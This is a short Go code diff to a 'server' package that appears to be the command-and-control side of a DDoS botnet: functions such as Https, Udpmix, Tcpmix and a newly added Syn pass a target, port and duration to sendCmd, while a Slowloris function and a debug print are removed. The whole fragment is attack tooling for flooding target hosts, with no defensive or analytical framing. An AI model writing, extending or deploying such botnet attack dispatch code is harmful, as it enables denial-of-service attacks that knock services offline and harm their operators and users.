@@ -2,7 +2,6 @@ package server
 
 import (
 	"encoding/base64"
-	"fmt"
 	"net"
 
 	"strconv"
@@ -43,17 +42,16 @@ func sendCmd(command_type string, target string, port string, duration string) {
 }
 
 func Https(target string, duration string, port string) {
-	fmt.Println(target, port, duration)
 	sendCmd("https", target, port, duration)
 
 }
 
-func Slowloris(target string, duration string, port string) {
-	sendCmd("slowloris", target, port, duration)
-}
-
 func Udpmix(target string, duration string, port string) {
 	sendCmd("udpmix", target, port, duration)
+}
+
+func Syn(target string, duration string, port string) {
+	sendCmd("syn", target, port, duration)
 }
 
 func Tcpmix(target string, duration string, port string) {
